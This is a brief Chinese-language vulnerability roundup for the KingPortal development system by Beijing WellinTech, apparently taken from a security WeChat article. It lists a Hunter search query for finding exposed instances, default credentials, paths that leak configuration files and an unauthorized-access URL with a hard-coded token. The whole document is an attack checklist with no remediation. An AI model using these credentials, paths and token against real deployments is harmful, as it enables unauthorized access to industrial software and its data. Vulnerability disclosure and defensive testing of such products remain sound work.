## 北京亚控科技KingPortal开发系统漏洞集合

## Hunter
```
web.title="KingPortal"
```


## 弱口令
```
admin001/admin001
admin001/kf_admin
```

## 信息泄露
```
/ProjectManager.json
/config/externalConfig.json
```

## KingPortal开发系统未授权访问
```
http://域名:11002/views/ProjectDataSourceAccess.html?token=2ccdf191078bd4e8e85b526ec44f7dd31ad7cf81&amp;refreshToken=null

```

## 漏洞来源
- https://mp.weixin.qq.com/s/fYnLnoeHvYFwaSSKfBjQZw
